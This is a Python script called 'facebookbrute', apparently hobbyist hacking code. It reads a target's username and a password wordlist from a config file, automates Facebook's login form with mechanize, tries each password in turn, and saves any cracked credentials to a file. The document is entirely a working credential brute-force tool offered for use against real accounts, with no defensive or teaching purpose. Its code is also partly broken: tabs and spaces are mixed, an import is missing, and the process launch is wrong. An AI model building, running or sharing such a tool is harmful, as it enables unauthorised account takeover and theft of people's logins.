#!/usr/bin/python
##########################
# Title: facebookbrute
# Author: Th3J0k3r
#
##########################

#
# The modules that are needed.
#
import mechanize
import time
import os
import ConfigParser
from multiprocessing import Process
from pathlib import Path
from bs4 import BeautifulSoup
from lazyme.string import color_print


#
# The banner.
#
def def_banner():

	os.system('clear')
	color_print(" ______             _                 _    ____             _", color='green')       
 	color_print("|  ____|           | |               | |  |  _ \           | |",color='green')  
 	color_print("| |__ __ _  ___ ___| |__   ___   ___ | | _| |_) |_ __ _   _| |_ ___", color='green')
	color_print("|  __/ _` |/ __/ _ | '_ \ / _ \ / _ \| |/ |  _ <| '__| | | | __/ _ \ ", color='green')
 	color_print("| | | (_| | (_|  __| |_) | (_) | (_) |   <| |_) | |  | |_| | ||  __/ ", color='green')
 	color_print("|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_|____/|_|   \__,_|\__\___| ", color='green')
                                                                     


	color_print("			Created By Th3J0k3r", color='green')

#
# Read in the config file.
#
def def_config ():
	
	# Read in the config file
	global configParser
	configParser = ConfigParser.RawConfigParser()	
	configParser.read('config')

	global passwords
	global dic_path
	dic_path = configParser.get('Config','dict')
	username = configParser.get('Config', 'user')
	if (Path(dic_path).is_file() == False):
		color_print("\n\n[!] Please define the username and wordlist in the config file", color='red')
		return
	if username == 'username' and dic_path == 'wordlist':
		color_print("\n\n[!] You need to setup the config file", color='red')
		return

	else:
		def_setup()
		def_process(def_login())

#
# Setup the browser.
#
def def_setup():

	# Set the socket timeout.
	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100

	# Setup Mechanize
	global browser
	browser = mechanize.Browser()
	browser.set_handle_robots(False)
	cookies = mechanize.CookieJar()
	browser.set_cookiejar(cookies)
	browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
	browser.set_handle_refresh(True)
	browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		
	# Check the config file to see if debugging is turned on.
	isDebugging = configParser.get('Config', 'debug')
	if isDebugging == 'True':
		# Want debugging messages?
		browser.set_debug_http(True)
		browser.set_debug_redirects(True)
		browser.set_debug_responses(True)


	# Catch any URLErrors when opening the page.
	url = 'http://www.facebook.com/login.php'
	try:
		browser.open(url)
		browser.select_form(nr = 0)
	except URLError as e:
		color_print("Try resetting your network interface" + e)

#
# MultiProcessing to speed up the crack
#
def def_process (f):
	p = Process(target=f)
	p.start()

#
# Attempt to login with multiple passwords
#
def def_login():

	# read in the username from the config file.
	browser.form['email'] = configParser.get('Config', 'user')
	
	with open(dic_path) as fp:
		line = fp.readline()
	   	while line:
	
			# This is the current password in the dictionary 
			# that we attempt to login with
			#
			password = format(line.strip())
			browser.form['pass'] = str(password)

			# Print out the tries
	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')

			# Try to Submit
			try:
 				request = browser.submit()
			except URLError as e:
				color_print("Try resetting your network interface" + e)
			

			# Declare a BeautifulSoup Object.
			soup = BeautifulSoup(request, 'html.parser')


			# Attempt to brute force the password.
			title = soup.title.string
			if title != 'Facebook':

				# PASSWORD NOT FOUND, DAMN!!
				action = soup.find('form', id='login_form').get('action')
				color_print(action, color='red')
				print("[!] Wrong password")
				browser.select_form(nr = 0)
	       			line = fp.readline()

				continue	
			else:

				# SUCCESS PASSWORD FOUND, YEY!!
				username = configParser.get('Config', 'user')	

				# Print out the credentials
				color_print("Password Cracked - Username: " + username + " Password: " + password, color='green')

				# Save the credentials to a file located in the passwords directory
				color_print("[!] Saving credentials to passwords/" + username, color='blue')	
				saveCreds = open('passwords/' + username + ".txt", 'w')
				saveCreds.write(username + '\n')
				saveCreds.write(password)
				saveCreds.close()
				break

			browser.select_form(nr = 0)
	       		line = fp.readline()
#
# call the methods.
#
def_banner()
def_config()
